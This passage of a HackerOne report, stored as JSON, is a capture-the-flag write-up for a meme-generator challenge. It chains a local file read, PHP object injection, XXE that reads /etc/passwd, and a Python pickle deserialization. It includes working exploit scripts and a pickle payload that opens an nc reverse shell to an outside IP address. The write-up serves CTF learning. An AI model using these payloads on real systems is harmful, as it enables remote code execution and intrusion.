4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=71e5b5243246a304114dae710aec37f1965c060cba7d54746d31675eec18dbd1\" class=\"markdown-inline-image\"></a></p>\n\n<p>So, now we have a Preety good XXE and I was not able to escalate it further. So, I used the http wrapper in XXE to find local service and i found one on port 1337. and the description of the application was </p>\n\n<p><strong>Meme Service - Internal Maintenance API - v0.1 (Alpha); API Documentation: Version 0.1 - Endpoints: /status - View maintenance status; /update-status Change maintenance status; Debug: The debug parameter allows debugging</strong></p>\n\n<p>On <code>status?debug=1</code> gives us the debug data/token base64 encoded in the response. decoding it to the base64 gives us the <strong>Python Pickle Data</strong>. Also <code>update-status?status</code> expects the parameter <strong>status</strong> for where I have generated a pickle code to generate a payload to get the reverse shell.</p>\n\n<p><strong>Exploit.py</strong></p>\n<pre class=\"highlight python\"><code><span class=\"c\">#!/usr/bin/env python</span>\n<span class=\"c\">#payload.py</span>\n<span class=\"kn\">import</span> <span class=\"nn\">pickle</span>\n<span class=\"kn\">import</span> <span class=\"nn\">socket</span>\n<span class=\"kn\">import</span> <span class=\"nn\">os</span>\n<span class=\"k\">class</span> <span class=\"nc\">payload</span><span class=\"p\">(</span><span class=\"nb\">object</span><span class=\"p\">):</span>\n    <span class=\"k\">def</span> <span class=\"nf\">__reduce__</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">):</span>\n       <span class=\"n\">comm</span> <span class=\"o\">=</span> <span class=\"s\">&quot;rm /tmp/shell; mknod /tmp/shell p; nc 104.248.230.193 8008 0&lt;/tmp/shell | /bin/sh 1&gt;/tmp/shell&quot;</span>\n       <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"n\">os</span><span class=\"o\">.</span><span class=\"n\">system</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"n\">comm</span><span class=\"p\">,))</span>\n<span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"n\">pickle</span><span class=\"o\">.</span><span class=\"n\">dumps</span><span class=\"p\">(</span> <span class=\"n\">payload</span><span class=\"p\">())</span>\n\n<span class=\"k\">print</span> <span class=\"n\">payload</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">&quot;base64&quot;</span><span class=\"p\">)</span>\n<span class=\"c\">#!/usr/bin/env python</span>\n<span class=\"c\">#payload.py</span>\n<span class=\"kn\">import</span> <span class=\"nn\">pickle</span>\n<span class=\"kn\">import</span> <span class=\"nn\">socket</span>\n<span class=\"kn\">import</span> <span class=\"nn\">os</span>\n<span class=\"k\">class</span> <span class=\"nc\">payload</span><span class=\"p\">(</span><span class=\"nb\">object</span><span class=\"p\">):</span>\n    <span class=\"k\">def</span> <span class=\"nf\">__reduce__</span><span class=\"p\">(</span><span class=\"bp\">self</span><span class=\"p\">):</span>\n       <span class=\"n\">comm</span> <span class=\"o\">=</span> <span class=\"s\">&quot;rm /tmp/shell; mknod /tmp/shell p; nc 111.111.111.111 8008 0&lt;/tmp/shell | /bin/sh 1&gt;/tmp/shell&quot;</span>\n       <span class=\"k\">return</span> <span class=\"p\">(</span><span class=\"n\">os</span><span class=\"o\">.</span><span class=\"n\">system</span><span class=\"p\">,</span> <span class=\"p\">(</span><span class=\"n\">comm</span><span class=\"p\">,))</span>\n<span class=\"n\">payload</span> <span class=\"o\">=</span> <span class=\"n\">pickle</span><span class=\"o\">.</span><span class=\"n\">dumps</span><span class=\"p\">(</span> <span class=\"n\">payload</span><span class=\"p\">())</span>\n\n<span class=\"k\">print</span> <span class=\"n\">payload</span><span class=\"o\">.</span><span class=\"n\">encode</span><span class=\"p\">(</span><span class=\"s\">&quot;base64&quot;</span><span class=\"p\">)</span>\n</code></pre>\n<p><strong>Generating a serialised payload</strong></p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\nclass ConfigFile{\n        public $config_raw = &#39;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL3NoZWxsOyBta25vZCAvdG1wL3NoZWxsIHA7IG5jIDEwNC4yNDguMjMwLjE5MyA4MDA4IDA8L3RtcC9zaGVsbCB8IC9iaW4vc2ggMT4vdG1wL3NoZWxsJwpwMQp0cDIKUnAzCi4=&quot;&gt; ]&gt;&lt;root&gt;\n    &lt;toptext&gt;&amp;xxe;&lt;/toptext&gt;\n    &lt;bottomtext&gt;xd&lt;/bottomtext&gt;\n    &lt;template&gt;&lt;/template&gt;\n    &lt;type&gt;text&lt;/type&gt;\n&lt;/root&gt;&#39;;\n    }\n\n    echo base64_encode(serialize([new ConfigFile]));\n?&gt;\n</code></pre>\n<h2 id=\"reverse-connection-and-flag\">Reverse Connection and flag</h2>\n\n<ul>\n<li>Use the base64 encoded payload of pickle and then use it to create a serialised data.\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-09-29_at_6.03.01_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/614/2e2523c5ec929ec4e70ca56ea6d7100bcceb1a2b/Screen_Shot_2018-09-29_at_6.03.01_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=64e99d4d9799850adb7ea3b6f86dc6fd0f166a8bb0af593ab24275e07bdb887c\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/614/2e2523c5ec929ec4e70ca56ea6d7100bcceb1a2b/Screen_Shot_2018-09-29_at_6.03.01_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=64e99d4d9799850adb7ea3b6f86dc6fd0f166a8bb0af593ab24275e07bdb887c\" class=\"markdown-inline-image\"></a>\n<a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2018-09-29_at_6.05.08_AM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/616/c8cbcabe4ee1424eea8ae8d1dc8d0b5ded600487/Screen_Shot_2018-09-29_at_6.05.08_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=f1c7697b9ab1b36ec401814e8f1adea7ba7076aa04dee5001c01d5721e2639ef\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/616/c8cbcabe4ee1424eea8ae8d1dc8d0b5ded600487/Screen_Shot_2018-09-29_at_6.05.08_AM.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQWYI2GPWO%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T221523Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDGZ9hZPNXy0op0dbUCK3A2FIHB%2BibDXwZCFl83WTNlShweklDkKhtUNsdiH1ZDSlGSdLObBpyGJdCeuHTlImqCYdt8f2yBKifOTf2TivYpJrNHupdtHvnqAWi7W9%2BjwJ%2BTCwiOrcStmIDnFCyyqwY6TAI5WG5MrEEDv8wrLdp996xp151lj%2F4um2Zv496W8ro76jvQ88joGdHpQVXnNfV1GVszM9x2MSCQxnQNnSXcnSWseYTKLzyFp0ZHOTPrPzq2uSlVkK%2F3QymE%2FxPIDTGw0YAH0dkxUT6j5w6dpcr%2BrzhYkptWupenUAF0MVqKJxNJZkBP3vJojReAQxLLf6Q5HsYqGm6jhS4748ZyTRZgChKL9lshIjpbjIu5MbLvwX%2F27PaXT7zSgwK903viGfy%2Bho9qoZUssvAToQJIzp0gqB8TNCETjgLLeFaQk13faNP%2Bs6DczQQAjcVHP0T4iXvprpJ7WF4Lgvdg6C%2FwSgLkD8N%2BofGZQflIFdduF6tbfUDe6RZqExPuAHXZR8zPF7DVwtnOckvWNNJFfV2j3cG1J4PetkJkxnwBNpnZP4nCyTKbwMPXXPODGNKYyXAqp3Qy95YBxWsTYos6qm4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=f1c7697b9ab1b36ec401814e8f1adea7ba7076aa04dee5001c01d5721e2639ef\" class=\"markdown-inline-image\"></a>\n</li>\n</ul>\n\n<p>Flag : flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}</p>\n\n<p>Thanks<br>\nAhmed!</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>not required.</p>\n", 
    "vulnerability_information": "So, Hackerone posted a tweet about the Meme CTF Where barcode was in the tweet image by scanning it and decoding from hex I found this link : https://h1-5411.h1ctf.com/ where we can  create/generate a memes and for generating the meme this was used form GitHub which i found in source code analysis `https://github.com/trepmal/meme-gen`.\n\n## Discovering Local File Read\n\nThere was a meme generator which generates the meme by from it's templates which was already present and it took 4 parameters: \n- template  ( name of the template which is used to generate meme ) \n- type ( Meme Type : image/text)\n- top-text \n- bottom-text\n\n{F352571}\n\nThe template parameter was vulnerable to local file read it take the file name available on the system and if present then it uses to create meme by adding the **Top** and **Bottom** Text.\n{F352576} \n\n{F352577}\n\n## Analysing the source code\n\nSince we have local file read we can download the source code of the application. by just changing the template parameter to 2 directory up `../../`.\n{F352580}\n\nIn this way I have downloaded the source code of the application one by one and arranged it to according to the web application.\n{F352584}\n\n**Finding vulnerability in Import memes( /api/import_memes_2.0.php)** : It was taking a file with serialised data with base64 encoded and then merging the files array in the session. \n\n```\n<?php\n  require_once(\"../includes/config.php\");\n\n  if (isset($_FILES['f'])) {\n    $new_memes = unserialize(base64_decode(file_get_contents($_FILES['f']['tmp_name'])));\n    \n    $_SESSION['memes'] = array_merge($_SESSION['memes'], $new_memes);\n  }\n\n  header(\"Location: /memes.php\");\n?>\n```\n\n\n**Finding vulnerability in classes.php**  The ` libxml_disable_entity_loader(false);` which disables the entity loader if the value is true. Since it was set to false so it allowed to load external entities.\n\n```\nclass ConfigFile {\n\n    function __construct($url) {\n      $this->config_raw = file_get_contents($url);\n    }\n\n    function parse() {\n      $dom = new DOMDocument();\n      $dom->loadXML($this->config_raw, LIBXML_NOENT | LIBXML_DTDLOAD);\n      $o = simplexml_import_dom($dom);\n\n      $this->top_text = $o->toptext;\n      $this->bottom_text = $o->bottomtext;\n      $this->template = $o->template;\n      $this->type = $o->type;\n    }\n\n    function generate() {\n      $this->parse();\n\n      $meme_path = \"https://giphy.com/embed/Vuw9m5wXviFIQ?try_harder\";\n\n      if ($this->type == IMAGE) {\n        if (@is_array(getimagesize($this->path))) {\n          $meme_path = MEMES_FOLDER . $filename . \".jpg\";\n\n          $args = array(\n            \"top_text\"    => $top_text,\n            \"bottom_text\" => $bottom_text,\n            \"filename\"    => $meme_path,\n            \"font\"        => FONT_BASE,\n            \"memebase\"    => $this->path,\n            \"textsize\"    => 40,\n            \"textfit\"     => true,\n            \"padding\"     => 10,\n          );\n\n          memegen_build_image($args);\n        }\n      }\n\n      if ($this->type == TEXT) {\n        if (!@is_array(getimagesize($this->path))) {\n          $contents = file_get_contents($this->path);\n          $meme = \"  \" . strtoupper($top_text) . \"\\n\\n\" . $contents . \"\\n  \" . strtoupper($bottom_text);\n          $meme_path = MEMES_FOLDER . $filename . \".txt\";\n          file_put_contents($meme_path, $meme);\n        }\n      }\n\n      return $meme_path;\n    }\n\n    function __toString() {\n      $this->parse();\n      $debug = \"\";\n      $debug .= \"Debug Info :\\n\";\n      $debug .= \"TopText => {$this->top_text}\\n\";\n      $debug .= \"BottomText => {$this->bottom_text}\\n\";\n      $debug .= \"Template Location => {$this->template}\\n\";\n      $debug .= \"Template Type => {$this->type}\\n\";\n      return $debug;\n    }\n  }\n```\n\nThe `parse()` function was was parsing the xml entities with the desired elements(toptext, bottomtext, type, template). which makes it vulnerable to XXE. But till now we don't have any direct way to exploit XXE. The attack was intended to chain with each other. but to exploit the php object injection the magic method `__toString()` needs to be called because only `__wakup()` gets called when unserialize is used but here no wakeup method so. But I investigated the code and found a way where `__toString()` is called there is a loop is meme.php when the session is getting echoed there our uploaded file gets echoed too.\n\n\n### XML Payload :\n```\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>\n\t<toptext>&xxe;</toptext>\n\t<bottomtext>xd</bottomtext>\n\t<template></template>\n\t<type>text</type>\n</root>\n```\n### Serialised payload (base64 Decoded): \n```\nO:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:170:\"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>\n\t<toptext>&xxe;</toptext>\n\t<bottomtext>xd</bottomtext>\n\t<template></template>\n\t<type>text</type>\n</root>\";}\n```\n\n## Exploit for generating the serialised data : \n**Exploit.php**\n```\n<?php\n\nclass ConfigFile{\n\t\tpublic $config_raw = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>\n\t<toptext>&xxe;</toptext>\n\t<bottomtext>xd</bottomtext>\n\t<template></template>\n\t<type>text</type>\n</root>';\n\t}\n\n\techo base64_encode(serialize([new ConfigFile]));\n?>\n```\n\n## Chaining XXE with PHP Object Injection and escalating:\n\nSo I have created an exploit which generates a serialised the data and encoded to base64.\n{F352605}\n\n{F352604}\n\nSo, now we have a Preety good XXE and I was not able to escalate it further. So, I used the http wrapper in XXE to find local service and i found one on port 1337. and the description of the application was \n\n**Meme Service - Internal Maintenance API - v0.1 (Alpha); API Documentation: Version 0.1 - Endpoints: /status - View maintenance status; /update-status Change maintenance status; Debug: The debug parameter allows debugging**\n\n\nOn `status?debug=1` gives us the debug data/token base64 encoded in the response. decoding it to the base64 gives us the **Python Pickle Data**. Also `update-status?status` expects the parameter **status** for where I have generated a pickle code to generate a payload to get the reverse shell.\n\n**Exploit.py**\n\n```\n#!/usr/bin/env python\n#payload.py\nimport pickle\nimport socket\nimport os\nclass payload(object):\n    def __reduce__(self):\n       comm = \"rm /tmp/shell; mknod /tmp/shell p; nc 104.248.230.193 8008 0</tmp/shell | /bin/sh 1>/tmp/shell\"\n       return (os.system, (comm,))\npayload = pickle.dumps( payload())\n\nprint payload.encode(\"base64\")\n#!/usr/bin/env python\n#payload.py\nimport pickle\nimport socket\nimport os\nclass payload(object):\n    def __reduce__(self):\n       comm = \"rm /tmp/shell; mknod /tmp/shell p; nc 111.111.111.111 8008 0</tmp/shell | /bin/sh 1>/tmp/shell\"\n       return (os.system, (comm,))\npayload = pickle.dumps( payload())\n\nprint payload.encode(\"base64\")\n```\n\n\n**Generating a serialised payload**\n```\n<?php\nclass ConfigFile{\n\t\tpublic $config_raw = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:1337/update-status?status=Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL3NoZWxsOyBta25vZCAvdG1wL3NoZWxsIHA7IG5jIDEwNC4yNDguMjMwLjE5MyA4MDA4IDA8L3RtcC9zaGVsbCB8IC9iaW4vc2ggMT4vdG1wL3NoZWxsJwpwMQp0cDIKUnAzCi4=\"> ]><root>\n\t<toptext>&xxe;</toptext>\n\t<bottomtext>xd</bottomtext>\n\t<template></template>\n\t<type>text</type>\n</root>';\n\t}\n\n\techo base64_encode(serialize([new ConfigFile]));\n?>\n```\n\n## Reverse Connection and flag \n- Use the base64 encoded payload of pickle and then use it to create a serialised data.\n{F352614}\n{F352616}\n\nFlag : flag{cha1n1ng_bugs_f0r_fun_4nd_pr0f1t?_or_rep0rt_an_LF1}\n\nThanks\nAhmed!\n\n## Impact\n\nnot required.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://tbd.com", 
            "about": null, 
            "twitter_handle": null, 
            "name": "h1-5411-CTF"
        }, 
        "handle": "h1-5411-ctf", 
        "url": "https://hackerone.com/h1-5411-ctf", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/033/314/1a0c110b0060c574d84b531160a0d2c58141ce6e_small.?1537539140", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/033/314/78d6c799326d92d4cad56dc8c1899a7ea55bc7f2_medium.?1537539140"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 33314, 
        "default_currency": "usd"
    }, 
    "is_published": false
}